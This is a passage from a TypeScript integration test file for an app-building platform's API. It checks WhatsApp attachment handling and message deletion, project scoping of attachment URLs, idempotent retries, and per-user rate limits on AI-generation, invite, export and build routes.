      createdSockets[0].sock.sendMessage = async () => {
        throw new Error("socket write failed");
      };

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "הנה הברושור", attachment: uploadBody.file }),
      });
      assert.equal(sendRes.status, 502, "confirms this is really exercising the failure path, not a successful send");

      assert.equal(existsSync(filePath), false, "the attachment file must be deleted from disk even though the send itself failed");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 979: the explicit, user-initiated remove/replace counterpart of the
 * after-send cleanup above -- a user who removes a chosen attachment (or
 * the frontend, when replacing it with a different file) before ever
 * sending previously had no way to clean it up at all short of deleting
 * the whole project.
 */
test("DELETE .../integrations/whatsapp/attachments removes the real file from disk", async () => {
  await withServer(async (baseUrl, _db, uploadsDir) => {
    const token = await signup(baseUrl, "whatsapp-attach-delete1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const formData = new FormData();
    formData.append("file", new File(["%PDF-fake-contents"], "note.pdf", { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    const uploadBody = (await uploadRes.json()) as { file: { url: string } };
    const filename = uploadBody.file.url.split("/").pop()!;
    const filePath = path.join(uploadsDir, project.id, "_whatsapp-attachments", filename);
    assert.ok(existsSync(filePath), "the fixture file must actually exist right after upload, or this test proves nothing");

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ url: uploadBody.file.url }),
    });
    assert.equal(deleteRes.status, 204);
    assert.equal(existsSync(filePath), false, "the file must actually be deleted from disk, not just unreferenced in the response");
  });
});

/**
 * Round 979: the delete route is deliberately best-effort/silent for a
 * reference that doesn't resolve to a real file (a stale/already-deleted
 * attachment, or a URL for a different project entirely) -- the caller
 * (WhatsAppPanel.tsx) never needs to distinguish "already gone" from
 * "successfully deleted just now", and must never surface an error for
 * either.
 */
test("DELETE .../integrations/whatsapp/attachments is a silent no-op for a reference that doesn't resolve to a real file", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "whatsapp-attach-delete2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ url: `/api/uploads/${project.id}/_whatsapp-attachments/not-a-real-upload.pdf` }),
    });
    assert.equal(deleteRes.status, 204, "a reference to a file that never existed must still report success, not a 400/404");
  });
});

/**
 * Round 973: `attachment.url` is client-supplied -- confirms the send route
 * never trusts it blindly. A URL pointing at a DIFFERENT project's own
 * attachments directory (even one that is otherwise perfectly well-formed)
 * must be rejected rather than resolved, since this project's own uploadsDir
 * check alone wouldn't catch a path that is still safely inside uploadsDir
 * overall, just under the wrong project id.
 */
test("POST .../integrations/whatsapp/send rejects an attachment url that doesn't belong to this project", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "whatsapp-attach2@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A second, unrelated project." }),
      });
      const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550006666:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const formData = new FormData();
      formData.append("file", new File(["fake-bytes"], "note.txt", { type: "text/plain" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/attachments/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      const { file } = (await uploadRes.json()) as { file: { url: string; name: string; mimeType: string } };

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "test", attachment: file }),
      });
      assert.equal(sendRes.status, 400);
      assert.equal(((await sendRes.json()) as { code?: string }).code, "INVALID_ATTACHMENT");
      assert.equal(createdSockets[0].sendCalls.length, 0, "must never reach the real send once the attachment reference is rejected");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 973: an attachment whose descriptor is otherwise well-formed and
 * whose url does belong to this project, but whose underlying file was
 * deleted from disk after upload (e.g. a server redeploy wiping the
 * uploads volume, or a concurrent cleanup) must fail cleanly rather than
 * crashing or sending whatever garbage happens to be at that path.
 */
test("POST .../integrations/whatsapp/send rejects an attachment whose uploaded file no longer exists on disk", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, _db, uploadsDir) => {
      const token = await signup(baseUrl, "whatsapp-attach3@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550007777:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const formData = new FormData();
      formData.append("file", new File(["fake-bytes"], "note.txt", { type: "text/plain" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      const { file } = (await uploadRes.json()) as { file: { url: string; name: string; mimeType: string } };
      const filename = file.url.split("/").pop()!;
      rmSync(path.join(uploadsDir, project.id, "_whatsapp-attachments", filename));

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "test", attachment: file }),
      });
      assert.equal(sendRes.status, 400);
      assert.equal(((await sendRes.json()) as { code?: string }).code, "ATTACHMENT_FILE_GONE");
      assert.equal(createdSockets[0].sendCalls.length, 0);
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

test("WhatsApp: clearing the message history wipes this project's log but never touches another project's", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const otherRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A separate vet clinic app." }),
      });
      const { project: otherProject } = (await otherRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });
      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "היי" }),
      });

      await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[1].sock.user = { id: "15550002222:1@s.whatsapp.net" };
      createdSockets[1].emitConnectionUpdate({ connection: "open" });
      await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972509999999", message: "שלום מהמרפאה" }),
      });

      const clearRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(clearRes.status, 204);

      const clearedRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: clearedMessages } = (await clearedRes.json()) as { messages: unknown[] };
      assert.equal(clearedMessages.length, 0);

      const otherStillThereRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/messages`, {
        headers: authHeaders(token),
      });
      const { messages: otherMessages } = (await otherStillThereRes.json()) as { messages: { body: string }[] };
      assert.equal(otherMessages.length, 1);
      assert.equal(otherMessages[0].body, "שלום מהמרפאה");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * New in this round: clearWhatsAppMessages above was previously the only
 * way to remove anything from the log at all -- one junk or test message
 * meant wiping the whole history. The new per-message DELETE route removes
 * exactly the one message the panel's own delete button targets, leaving
 * every other message (in this project, and in a different project) alone.
 */
test("WhatsApp: deleting a single message via DELETE .../messages/:messageId removes only that one, leaving the rest of the log and another project's log untouched", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const otherRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A separate vet clinic app." }),
      });
      const { project: otherProject } = (await otherRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });
      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "delete this one" }),
      });
      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "keep this one" }),
      });

      await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[1].sock.user = { id: "15550002222:1@s.whatsapp.net" };
      createdSockets[1].emitConnectionUpdate({ connection: "open" });
      await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972509999999", message: "a different project's own message" }),
      });

      const beforeRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: before } = (await beforeRes.json()) as { messages: { id: string; body: string }[] };
      const target = before.find((m) => m.body === "delete this one")!;
      assert.ok(target, "expected to find the message to delete");

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages/${target.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(deleteRes.status, 204);

      const afterRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: after } = (await afterRes.json()) as { messages: { body: string }[] };
      assert.equal(after.length, 1);
      assert.equal(after[0].body, "keep this one");

      const otherRes2 = await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: otherMessages } = (await otherRes2.json()) as { messages: { body: string }[] };
      assert.equal(otherMessages.length, 1, "a different project's own message must be completely untouched");
      assert.equal(otherMessages[0].body, "a different project's own message");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

test("WhatsApp: deleting a message id that doesn't exist in this project returns a real 404, not a silent success", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages/no-such-message-id`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 404);
  });
});

/**
 * Round 958: same withIdempotency gap, and the same fix, as
 * deleteCheckpoint's own fix (round 944) -- deleteWhatsAppMessage
 * (packages/db/src/whatsapp.ts) throws NotFoundError once the row is
 * actually gone, with no special case for a retry. fetchWithWakeRetry
 * retries on ANY thrown fetch() error, so a response lost in transit
 * after the message was already deleted used to surface a confusing 404
 * for a delete that, from the user's point of view, already fully
 * succeeded.
 */
test("DELETE .../integrations/whatsapp/messages/:messageId retried with the same idempotency key after the first attempt already succeeded replays the original 204, instead of 404ing on the already-deleted message", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });
      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "delete this one" }),
      });

      const beforeRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: before } = (await beforeRes.json()) as { messages: { id: string; body: string }[] };
      const target = before.find((m) => m.body === "delete this one")!;
      assert.ok(target, "expected to find the message to delete");

      const headers = { ...authHeaders(token), "x-idempotency-key": "whatsapp-message-delete-repro-key" };
      const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages/${target.id}`, {
        method: "DELETE",
        headers,
      });
      assert.equal(firstRes.status, 204);

      const afterFirstRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: afterFirst } = (await afterFirstRes.json()) as { messages: { id: string }[] };
      assert.ok(!afterFirst.some((m) => m.id === target.id), "the message must genuinely be gone after the first call");

      const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages/${target.id}`, {
        method: "DELETE",
        headers,
      });
      assert.equal(
        retryRes.status,
        204,
        "a retried deletion with the same idempotency key must replay the original success, not 404 on the already-deleted message",
      );
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

test("WhatsApp: a real incoming message from the linked socket is logged and matched to the right customer record", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
      await collectSSE(buildRes);

      const createCustomerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Levi", phone: "050-123-4567", status: "New" }),
      });
      assert.equal(createCustomerRes.status, 201);

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      // This part of the flow -- a message arriving over the live socket --
      // has no HTTP surface (unlike the old Meta webhook): Baileys delivers
      // it as a `messages.upsert` event on the socket itself, so it's
      // simulated directly on the fake socket the manager is holding.
      createdSockets[0].emitMessagesUpsert({
        type: "notify",
        messages: [
          {
            key: { remoteJid: "972501234567@s.whatsapp.net", fromMe: false },
            message: { conversation: "מתי התור שלי?" },
          },
        ],
      });

      const messagesRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages } = (await messagesRes.json()) as {
        messages: { direction: string; body: string; matchedLabel: string | null; matchedEntityName: string | null }[];
      };
      assert.equal(messages.length, 1);
      assert.equal(messages[0].direction, "in");
      assert.equal(messages[0].body, "מתי התור שלי?");
      assert.equal(messages[0].matchedEntityName, "Customer");
      assert.equal(messages[0].matchedLabel, "Dana Levi");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

test("the idea-enhance endpoint requires auth, rejects an empty idea, and expands a real one", async () => {
  await withServer(async (baseUrl) => {
    const noAuth = await fetch(`${baseUrl}/api/ideas/enhance`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ idea: "a hair salon" }),
    });
    assert.equal(noAuth.status, 401);

    const token = await signup(baseUrl);

    const empty = await fetch(`${baseUrl}/api/ideas/enhance`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ idea: "" }),
    });
    assert.equal(empty.status, 400);

    const idea = "a booking app for a hair salon with customers and appointments";
    const res = await fetch(`${baseUrl}/api/ideas/enhance`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ idea }),
    });
    assert.equal(res.status, 200);
    const { enhanced, providerName } = (await res.json()) as { enhanced: string; providerName: string };
    assert.equal(providerName, "heuristic"); // no ANTHROPIC_API_KEY in the test environment
    assert.match(enhanced, /Customer/);
    assert.ok(enhanced.length > idea.length);

    // The enhanced text is a real, usable description -- feed it straight into project creation,
    // proving this genuinely "runs the AI's own improved prompt through the normal pipeline" rather
    // than being a dead-end preview.
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: enhanced }),
    });
    assert.equal(createRes.status, 201);
    const { project } = (await createRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.ok(project.spec.entities.some((e) => e.name === "Customer"));
  });
});

/**
 * apps/api/src/routes/auth.ts already hit this exact problem and fixed it
 * (formatValidationError, moved into httpError.ts so both routers can
 * share it) -- but the fix was never reused here, so every failed
 * validation on these 4 project routes sent the client Zod's raw
 * JSON.stringify(issues) dump as its "error" text instead of readable
 * words. See docs/roadmap.md for the bug this test covers.
 */
/**
 * Round 858: routes/auth.ts already has a volumetric rate limiter on
 * every unauthenticated route (signup/login/forgot-password/verify-code,
 * rounds 847-857), but routes/projects.ts -- which spends real, metered
 * Anthropic API cost on /ideas/enhance, POST /projects, .../answers, and
 * .../refine every single call (whenever ANTHROPIC_API_KEY is
 * configured, which it is for this app's real deployment) -- had none at
 * all. activePipelines only guards against two overlapping requests on
 * the SAME project; it does nothing to stop one authenticated account
 * looping any of these calls indefinitely. Confirms the new shared,
 * per-user limiter: calls to /ideas/enhance and POST /projects draw from
 * the SAME budget (not one counter per route -- alternating between them
 * must not let a caller dodge the cap), the limit is keyed by user id
 * (not IP, since every route here is already authenticated), and a
 * completely different account gets its own fresh allowance.
 */
test("POST /ideas/enhance and POST /projects share one per-user AI-generation rate limit: the 31st call across both routes is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-ai-gen@example.com");
    const idea = "a booking app for a hair salon with customers and appointments";

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/ideas/enhance`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ idea }),
      });
      assert.notEqual(res.status, 429, `ideas/enhance call ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    // The 31st call across the SAME budget, on a DIFFERENT route -- proves
    // the limit is shared, not one independent counter per route.
    const blocked = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: idea }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // this is keyed by user id, not IP (every request above came from the
    // same test client/IP), so one account exhausting its own budget must
    // never collaterally block anyone else.
    const otherToken = await signup(baseUrl, "unrelated-account@example.com");
    const otherRes = await fetch(`${baseUrl}/api/ideas/enhance`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ idea }),
    });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1052: POST .../collaborators had no volumetric throttle at all,
 * unlike every sibling route that can reveal whether an email belongs to a
 * real account (auth.ts's forgot-password/login/verify-code/reset-password
 * limiters, rounds 847-894). This route answers that exact question even
 * more directly -- a distinct 404 naming the probed email back verbatim
 * when no account exists, versus 201 success when one does -- and was
 * reachable by any signed-up user who owns one free project, with zero
 * server-side cap on how many emails they could probe per minute.
 */
test("POST .../collaborators is rate-limited per authenticated account: the 31st invite attempt is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rate-limit-invite-owner@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: `no-such-account-${i}@example.com` }),
      });
      assert.notEqual(res.status, 429, `invite attempt ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
      assert.equal(res.status, 404, "probing a nonexistent email must still get the normal COLLABORATOR_USER_NOT_FOUND response, not a 429");
    }

    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "no-such-account-30@example.com" }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account (owning its own separate project) must
    // get its own fresh allowance -- keyed by user id, not IP, so one
    // account exhausting its own budget must never collaterally block an
    // unrelated account's own legitimate invites.
    const otherOwnerToken = await signup(baseUrl, "rate-limit-invite-other-owner@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ description: "A separate, unrelated project." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ email: "no-such-account-other@example.com" }),
    });
    assert.equal(otherRes.status, 404, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1053: /export, /backup, and /twin had no volumetric throttle at
 * all, despite being the heaviest, fully-synchronous CPU-bound GET routes
 * in this router (zip.ts/backup.ts/twin.ts contain zero async/await) --
 * any authenticated collaborator could script a tight loop against their
 * own project that stalls this app's one shared Node event loop for every
 * other user/project too. All three share one budget (expensiveReadRateLimiter),
 * so the 21st call across all three routes combined, not 20 on each
 * individually, is what gets blocked.
 */
test("GET .../export, .../backup, and .../twin share one per-user rate limit: the 21st call across all three routes is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-expensive-read@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const routes = ["export", "backup", "twin"];
    for (let i = 0; i < 20; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/${routes[i % routes.length]}`, { headers: authHeaders(token) });
      assert.notEqual(res.status, 429, `call ${i + 1} of 20 (within the shared limit) must not be rate-limited yet`);
    }

    // The 21st call across the SAME budget, on a DIFFERENT one of the three
    // routes -- proves this is one shared counter, not three independent ones.
    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/twin`, { headers: authHeaders(token) });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-expensive-read-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ description: "A separate, unrelated project." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherBuildRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/build`, { method: "POST", headers: authHeaders(otherToken) });
    await collectSSE(otherBuildRes);
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/twin`, { headers: authHeaders(otherToken) });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1153: /build had NO volumetric throttle at all, unlike /refine
 * right next to it (aiGenerationRateLimiter) and the heaviest synchronous
 * GET routes in this router (export/backup/twin -> expensiveReadRateLimiter,
 * round 1053) -- despite running a comparably heavy pipeline itself
 * (diffAndMigrate DDL, seed inserts, runQaChecks, runSecurityScan, all
 * synchronous on this app's one shared Node event loop). Uses
 * /projects/from-template (itself cheap and unthrottled, since it only
 * ever does a bare insertProject with no pipeline run) to generate 21
 * fresh, already-buildable draft projects without touching
 * aiGenerationRateLimiter's own separate budget, isolating this test to
 * buildPipelineRateLimiter alone.
 */
test("POST .../build has its own per-user rate limit: the 21st build is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-build@example.com");

    for (let i = 0; i < 20; i++) {
      const createRes = await fetch(`${baseUrl}/api/projects/from-template`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ templateId: "crm" }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
      assert.notEqual(buildRes.status, 429, `build ${i + 1} of 20 (within the limit) must not be rate-limited yet`);
      await collectSSE(buildRes);
    }

    const extraCreateRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm" }),
    });
    const { project: extraProject } = (await extraCreateRes.json()) as { project: { id: string } };
    const blocked = await fetch(`${baseUrl}/api/projects/${extraProject.id}/build`, { method: "POST", headers: authHeaders(token) });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-build-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ templateId: "crm" }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/build`, { method: "POST", headers: authHeaders(otherToken) });
    assert.notEqual(otherRes.status, 429, "a different account must not be collaterally blocked by another account's own rate limit");
    await collectSSE(otherRes);
  });
});

/**
 * Round 1163: round 1153's own survey confirmed /projects/from-template
 * and /projects/:id/clone "correctly unthrottled on their own merits"
 * because neither runs the real pipeline /build does -- but that never
 * addressed the separate, real concern that both are still an
 * unconditional insertProject with zero volumetric cap, unlike
 * aiGenerationRateLimiter's own identical insertProject on POST /projects.
 * Cycles across both routes to prove the shared budget spans the whole
 * family, not just one route (same shape as the export/backup/twin test
